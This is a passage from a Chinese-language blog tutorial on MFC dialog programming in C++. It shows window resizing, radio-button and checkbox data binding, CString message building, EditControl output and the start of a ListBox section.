src="/2022/07/25/mfc01/062.png" class=""><p>控件拖动完毕后，修改一下id，然后双击按钮跳到代码编辑部分。</p><p>放大还是缩小总归是要知道窗口的大小先</p><p>现在头文件里预定一大一小</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//窗口大小</span></span><br><span class="line">CRect m_large;</span><br><span class="line">CRect m_small;</span><br></pre></td></tr></table></figure><p><strong>注：CRect有四个成员分别是left,top这二者代表矩形左上角顶点坐标，right，bottom代表矩形右下角的坐标，草图如下：</strong></p><img src="/2022/07/25/mfc01/068.png" class=""><p>然后在源文件的<code>OnInitDialog()</code>初始化一下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">GetWindowRect</span>(m_large);</span><br><span class="line">m_small = m_large;</span><br><span class="line">m_small.right = m_small.left + m_small.<span class="built_in">Width</span>() / <span class="number">2</span>;</span><br><span class="line">m_small.bottom = m_small.top + m_small.<span class="built_in">Height</span>() / <span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>最后给放大缩小实现一下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBingDialog::OnBnClickedBtnLarge</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">CRect curRect;<span class="comment">//获取当前窗口尺寸信息</span></span><br><span class="line"><span class="built_in">GetWindowRect</span>(curRect);</span><br><span class="line"><span class="built_in">SetWindowPos</span>(<span class="literal">NULL</span>, curRect.left, curRect.top,</span><br><span class="line"> m_large.<span class="built_in">Width</span>(), m_large.<span class="built_in">Height</span>(),</span><br><span class="line"> SWP_NOMOVE | SWP_NOZORDER</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBingDialog::OnBnClickedBtnSmall</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">CRect curRect;</span><br><span class="line"><span class="built_in">GetWindowRect</span>(curRect);</span><br><span class="line"><span class="built_in">SetWindowPos</span>(<span class="literal">NULL</span>, curRect.left, curRect.top,</span><br><span class="line"> m_small.<span class="built_in">Width</span>(), m_small.<span class="built_in">Height</span>(),</span><br><span class="line"> SWP_NOMOVE | SWP_NOZORDER</span><br><span class="line">);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>SWP_NOZORDER：忽略第一个参数；SWP_NOMOVE：忽略x、y，维持位置不变</strong></p><p>curRect都是为了先获取当前窗口尺寸<br>所以当setwindowpos的时候，xy不需要改变，cx和cy则是用m_large和m_small改变。<br>不过因为m_large初始化的时候是直接根据当前窗口大小来的，所以一开始点击放大是没有反应的，当缩小了之后在点击放大才会改变回原有尺寸</p><img src="/2022/07/25/mfc01/063.png" class=""><p>这里调整了一下俩按钮的位置，因为没有加滑动条，所以缩小了原有位置就够不到了。</p><img src="/2022/07/25/mfc01/064.png" class=""><p>不过可以看出上述按钮实现雷同点比较多。<br>那么就有一个骚操作，就是通过获取按钮标签名去改变</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBingDialog::OnBnClickedBtnLarge</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">CRect curRect;<span class="comment">//获取当前窗口尺寸信息</span></span><br><span class="line"><span class="built_in">GetWindowRect</span>(curRect);</span><br><span class="line"></span><br><span class="line">CWnd *pButton = <span class="built_in">GetDlgItem</span>(IDC_BTN_LARGE);</span><br><span class="line">CString strTitle;</span><br><span class="line"><span class="keyword">if</span> ( pButton ) &#123;</span><br><span class="line">pButton-&gt;<span class="built_in">GetWindowText</span>(strTitle);</span><br><span class="line"><span class="keyword">if</span> ( strTitle == _T(<span class="string">&quot;放大&quot;</span>) ) &#123;</span><br><span class="line">pButton-&gt;<span class="built_in">SetWindowText</span>(_T(<span class="string">&quot;缩小&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">SetWindowPos</span>(<span class="literal">NULL</span>, curRect.left, curRect.top,</span><br><span class="line"> m_large.<span class="built_in">Width</span>(), m_large.<span class="built_in">Height</span>(),</span><br><span class="line"> SWP_NOMOVE | SWP_NOZORDER</span><br><span class="line">);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">pButton-&gt;<span class="built_in">SetWindowText</span>(_T(<span class="string">&quot;放大&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">SetWindowPos</span>(<span class="literal">NULL</span>, curRect.left, curRect.top,</span><br><span class="line">m_small.<span class="built_in">Width</span>(), m_small.<span class="built_in">Height</span>(),</span><br><span class="line">SWP_NOMOVE | SWP_NOZORDER</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/065.png" class=""><img src="/2022/07/25/mfc01/066.png" class=""><img src="/2022/07/25/mfc01/067.png" class=""><p>先点击放大，发现按钮名变成缩小了，然后再次点击，窗口缩小，按钮名称变成放大，再点击就放大了，按钮名称就变成缩小。</p><p>所以另一个按钮就没有存在的必要了，把这个放大按钮的名称改成缩小，这样一来开头的光变名字就可以省去了。</p><p>最后做一个安全的设计</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CBingDialog::OnBnClickedBtnLarge</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">CRect curRect;<span class="comment">//获取当前窗口尺寸信息</span></span><br><span class="line"><span class="built_in">GetWindowRect</span>(curRect);</span><br><span class="line"></span><br><span class="line">CWnd *pButton = <span class="built_in">GetDlgItem</span>(IDC_BTN_LARGE);</span><br><span class="line">CString strTitle;</span><br><span class="line"><span class="keyword">if</span> ( pButton ) &#123;</span><br><span class="line">pButton-&gt;<span class="built_in">GetWindowText</span>(strTitle);</span><br><span class="line"><span class="keyword">if</span> ( strTitle == _T(<span class="string">&quot;放大&quot;</span>) &amp;&amp; (m_large.<span class="built_in">IsRectEmpty</span>() == FALSE) ) &#123;</span><br><span class="line">pButton-&gt;<span class="built_in">SetWindowText</span>(_T(<span class="string">&quot;缩小&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">SetWindowPos</span>(<span class="literal">NULL</span>, curRect.left, curRect.top,</span><br><span class="line"> m_large.<span class="built_in">Width</span>(), m_large.<span class="built_in">Height</span>(),</span><br><span class="line"> SWP_NOMOVE | SWP_NOZORDER</span><br><span class="line">);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ( m_large.<span class="built_in">IsRectEmpty</span>() == FALSE ) &#123;</span><br><span class="line">pButton-&gt;<span class="built_in">SetWindowText</span>(_T(<span class="string">&quot;放大&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">SetWindowPos</span>(<span class="literal">NULL</span>, curRect.left, curRect.top,</span><br><span class="line">m_small.<span class="built_in">Width</span>(), m_small.<span class="built_in">Height</span>(),</span><br><span class="line">SWP_NOMOVE | SWP_NOZORDER</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>IsRectEmpty()</code>主要是为了判断这个窗口如果left、top、right、bottom都一样的话，说明这个窗口就只有一个点，并没有办法完成缩放和放大了。</p><blockquote><p>窗口其实除了大小，就是绘制的位置，有的时候不是在当前窗口之上绘制，就有可能掉下去一层跟后面的窗口平级，至于窗口为什么能叠加，应该是除了xy，还有一个z轴，是3d模型的经典概念。</p></blockquote><hr><h2 id="常用控件"><a href="#常用控件" class="headerlink" title="常用控件"></a>常用控件</h2><p>空间交互，首先要创建控件或者说拖个出来，交互，就需要绑定控件或者变量，在消息中有来有回实现一些功能。</p><p>例如上述所学到的函数<code>GetDlgItem</code>，他就可以通过控件id获取到对应的控件<br><code>CListBox *list  = (CListBox*)GetDlgItem(控件id)</code></p><p>绑定控件和变量，在消息中曾使用到<code>UpdateData(TRUE|FALSE)</code>，默认不填写为TRUE，也就是将控件内容第一时间同步到变量上，FALSE则是将变量同步回控件</p><hr><h3 id="Radio"><a href="#Radio" class="headerlink" title="Radio"></a>Radio</h3><p>随便建个mfc项目，选择对话框类型，有的没的取消勾选</p><img src="/2022/07/25/mfc01/069.png" class=""><p>然后绘制这样的窗口，其中radio和check按钮，最后一个button</p><p>性别直接添加一个变量就可以了，原本想着用bool类型，但是考虑到得有个初始值，其实这个初始化关系到也不是特别大，但此处就换个万一弄弄，用int来表示，那么就需要注意了，你需要修改初始化部分</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CMFCButtonDlg::<span class="built_in">CMFCButtonDlg</span>(CWnd* pParent <span class="comment">/*=nullptr*/</span>)</span><br><span class="line">: <span class="built_in">CDialogEx</span>(IDD_MFCBUTTON_DIALOG, pParent)</span><br><span class="line">    , <span class="built_in">m_sex</span>(<span class="number">-1</span>)&#123;</span><br><span class="line">m_hIcon = <span class="built_in">AfxGetApp</span>()-&gt;<span class="built_in">LoadIcon</span>(IDR_MAINFRAME);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>m_sex为我们添加的变量名，括号代表初始化值，默认是0，但这里的思路是-1为未初始化，0为男 1为女这样。</p><p>如此一来，结果那个按钮第一步就可以上手了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnResult</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">UpdateData</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( m_sex == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;请选择性别&quot;</span>), _T(<span class="string">&quot;性别缺失&quot;</span>), MB_OK | MB_ICONEXCLAMATION);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>_T只是为了兼容unicode，在你的项目编码是ANSI的时候下次转换能保证字符串不出错，其次还有一个_L，它是不管编译方式都按unicode保存</strong></p><p><strong>万国码通用保存2两字节，ANSI英文一字节汉语两字节，再次强调</strong></p><p><code>MB_ICONEXCLAMATION</code>是一个警告图标，不同于<code>SWP_NOZORDER</code>，前者为黄色感叹号，后者为红色x号。</p><p>然后打印，肯定就要用CString了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnResult</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">UpdateData</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( m_sex == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;请选择性别&quot;</span>), _T(<span class="string">&quot;性别缺失&quot;</span>), MB_OK | MB_ICONEXCLAMATION);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CString strMsg = _T(<span class="string">&quot;您的性别是：&quot;</span>) + (m_sex == <span class="number">0</span>) ? _T(<span class="string">&quot;男\n&quot;</span>) : _T(<span class="string">&quot;女\n&quot;</span>);</span><br><span class="line"><span class="built_in">MessageBox</span>(strMsg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>run的时候会发现</p><img src="/2022/07/25/mfc01/070.png" class=""><p>额前面那句好像没有加上，原因应该是Cstring没有重写string+string吧</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnResult</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">UpdateData</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( m_sex == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;请选择性别&quot;</span>), _T(<span class="string">&quot;性别缺失&quot;</span>), MB_OK | MB_ICONEXCLAMATION);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CString strMsg = <span class="built_in">CString</span>(_T(<span class="string">&quot;您的性别是：&quot;</span>)) + ((m_sex == <span class="number">0</span>) ? _T(<span class="string">&quot;男\n&quot;</span>) : _T(<span class="string">&quot;女\n&quot;</span>));</span><br><span class="line"><span class="built_in">MessageBox</span>(strMsg, _T(<span class="string">&quot;tips&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改之后：</p><img src="/2022/07/25/mfc01/071.png" class=""><p>对于多选框，类型一般还是bool比较合适，但是默认的添加变量都是单个类型，所以我们在自动的基础上，给他改成数组</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 爱好</span></span><br><span class="line">BOOL m_hobby[<span class="number">3</span>];</span><br></pre></td></tr></table></figure><p>那么在源文件就要注意：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">CMFCButtonDlg::<span class="built_in">CMFCButtonDlg</span>(CWnd* pParent <span class="comment">/*=nullptr*/</span>)</span><br><span class="line">: <span class="built_in">CDialogEx</span>(IDD_MFCBUTTON_DIALOG, pParent)</span><br><span class="line">    , <span class="built_in">m_sex</span>(<span class="number">-1</span>) &#123;</span><br><span class="line"><span class="built_in">memset</span>(m_hobby, <span class="number">0</span>, <span class="built_in">sizeof</span>(m_hobby));</span><br><span class="line"></span><br><span class="line">m_hIcon = <span class="built_in">AfxGetApp</span>()-&gt;<span class="built_in">LoadIcon</span>(IDR_MAINFRAME);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::DoDataExchange</span><span class="params">(CDataExchange* pDX)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CDialogEx::<span class="built_in">DoDataExchange</span>(pDX);</span><br><span class="line"><span class="built_in">DDX_Radio</span>(pDX, IDC_RAD_MAN, m_sex);</span><br><span class="line"><span class="built_in">DDX_Check</span>(pDX, IDC_CK_FB, m_hobby[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">DDX_Check</span>(pDX, IDC_CK_BKB, m_hobby[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">DDX_Check</span>(pDX, IDC_CK_YOGA, m_hobby[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>手动修改成数组</p><p>最后完善一下结果消息</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnResult</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">UpdateData</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( m_sex == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;请选择性别&quot;</span>), _T(<span class="string">&quot;性别缺失&quot;</span>), MB_OK | MB_ICONEXCLAMATION);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CString strMsg = <span class="built_in">CString</span>(_T(<span class="string">&quot;您的性别是：&quot;</span>)) + ((m_sex == <span class="number">0</span>) ? _T(<span class="string">&quot;男\n&quot;</span>) : _T(<span class="string">&quot;女\n&quot;</span>));</span><br><span class="line">strMsg += _T(<span class="string">&quot;你的爱好有：&quot;</span>);</span><br><span class="line">CString hobby[<span class="number">3</span>]&#123; _T(<span class="string">&quot;足球&quot;</span>),_T(<span class="string">&quot;篮球&quot;</span>),_T(<span class="string">&quot;瑜伽&quot;</span>) &#125;;</span><br><span class="line"><span class="keyword">for</span>( <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ )&#123;</span><br><span class="line"><span class="keyword">if</span>( m_hobby[i] )&#123;</span><br><span class="line">strMsg += hobby[i] + _T(<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">MessageBox</span>(strMsg, _T(<span class="string">&quot;tips&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/07/25/mfc01/072.png" class=""><p>就ok了，这两个按钮的应用还算基础的。</p><p>当然自己定义数组一个办法，也可以通过控件id，get他的name<br>至于说这个id该通过什么办法<br>比如项目头文件里面有个叫<code>Resource.h</code>的，打开之后会看到他宏定义了我们跟控件有关的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IDD_MFCBUTTON_DIALOG            102</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDR_MAINFRAME                   128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_BUTTON1                     1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_BTN_RESULT                  1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_RAD_MAN                     1001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_RAD_WOMEN                   1002</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_CK_FB                       1003</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_CK_BKB                      1004</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IDC_CK_YOGA                     1005</span></span><br></pre></td></tr></table></figure><p>复选框就看后面仨，有了这个其实会容易很多，因为他们是连续的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnResult</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">UpdateData</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( m_sex == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;请选择性别&quot;</span>), _T(<span class="string">&quot;性别缺失&quot;</span>), MB_OK | MB_ICONEXCLAMATION);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CString strMsg = <span class="built_in">CString</span>(_T(<span class="string">&quot;您的性别是：&quot;</span>)) + ((m_sex == <span class="number">0</span>) ? _T(<span class="string">&quot;男\n&quot;</span>) : _T(<span class="string">&quot;女\n&quot;</span>));</span><br><span class="line">strMsg += _T(<span class="string">&quot;你的爱好有：&quot;</span>);</span><br><span class="line"><span class="comment">//CString hobby[3]&#123; _T(&quot;足球&quot;),_T(&quot;篮球&quot;),_T(&quot;瑜伽&quot;) &#125;;</span></span><br><span class="line"></span><br><span class="line">UINT nId = IDC_CK_FB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ )&#123;</span><br><span class="line"><span class="keyword">if</span>( m_hobby[i] )&#123;</span><br><span class="line"><span class="comment">//strMsg += hobby[i] + _T(&quot; &quot;);</span></span><br><span class="line">CString sName;</span><br><span class="line"><span class="built_in">GetDlgItemText</span>(nId + i, sName);</span><br><span class="line">strMsg += sName;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">MessageBox</span>(strMsg, _T(<span class="string">&quot;tips&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为从足球开始，后面只需要+1就可以得到，倒是省了定义一个数组。</p><img src="/2022/07/25/mfc01/073.png" class=""><p><strong>但是这个是基于你这几个复选框是连续的，id才能跟的上，不然跟数组没啥太大差别</strong></p><hr><h3 id="EditControl"><a href="#EditControl" class="headerlink" title="EditControl"></a>EditControl</h3><p>工具箱里找</p><img src="/2022/07/25/mfc01/074.png" class=""><p>然后拖出来，稍微调整一下大小</p><img src="/2022/07/25/mfc01/075.png" class=""><p>对应的属性也有不少，好在2022都做成中文了</p><img src="/2022/07/25/mfc01/076.png" class=""><p>这玩意说实在没啥必要演示，自己试几下就行了，但是有个基础应用的地方到时跟上面能联动<br>就是将我们选完之后的内容打印在editcontrol中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">CMFCButtonDlg::OnBnClickedBtnResult</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line"><span class="built_in">UpdateData</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( m_sex == <span class="number">-1</span> )&#123;</span><br><span class="line"><span class="built_in">MessageBox</span>(_T(<span class="string">&quot;请选择性别&quot;</span>), _T(<span class="string">&quot;性别缺失&quot;</span>), MB_OK | MB_ICONEXCLAMATION);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CString strMsg = <span class="built_in">CString</span>(_T(<span class="string">&quot;您的性别是：&quot;</span>)) + ((m_sex == <span class="number">0</span>) ? _T(<span class="string">&quot;男\r\n&quot;</span>) : _T(<span class="string">&quot;女\r\n&quot;</span>));</span><br><span class="line">strMsg += _T(<span class="string">&quot;你的爱好有：&quot;</span>);</span><br><span class="line"><span class="comment">//CString hobby[3]&#123; _T(&quot;足球&quot;),_T(&quot;篮球&quot;),_T(&quot;瑜伽&quot;) &#125;;</span></span><br><span class="line"></span><br><span class="line">UINT nId = IDC_CK_FB;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>( <span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++ )&#123;</span><br><span class="line"><span class="keyword">if</span>( m_hobby[i] )&#123;</span><br><span class="line"><span class="comment">//strMsg += hobby[i] + _T(&quot; &quot;);</span></span><br><span class="line">CString sName;</span><br><span class="line"><span class="built_in">GetDlgItemText</span>(nId + i, sName);</span><br><span class="line">strMsg += sName;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CEdit* edit = (CEdit*)<span class="built_in">GetDlgItem</span>(IDC_EDIT1);</span><br><span class="line"><span class="comment">//edit-&gt;GetWindowTextW();</span></span><br><span class="line">edit-&gt;<span class="built_in">SetWindowText</span>(strMsg);<span class="comment">//设置文本</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">MessageBox</span>(strMsg, _T(<span class="string">&quot;tips&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中要注意editcontrol属性要设置几个地方</p><ol><li>多行 true</li><li>想要返回 true</li><li>就是写入的strMsg想要换行，要在中间加<code>\r\n</code>，单纯的<code>\n</code>好像不起作用</li></ol><p>效果就是如下：</p><img src="/2022/07/25/mfc01/077.png" class=""><p>点击完成后往edit里面写入，和弹出对话框</p><img src="/2022/07/25/mfc01/078.png" class=""><hr><h3 id="ListBox"><a href="#ListBox" class="headerlink" title="ListBox"></a>ListBox</h3><p>老样子在dialog界面打开工具箱，找到listbox</p><img src="/2022/07/25/mfc01/079.png" class=""><p>然后属性都是中文名了，实在不行点击一下下面还有介绍，再不济就自己修改试试</p><img src="/2022/07/25/mfc01/080.png" class=""><p>随便搞个例子试试</p><img src="/2022/07/25/mfc01/082.png" 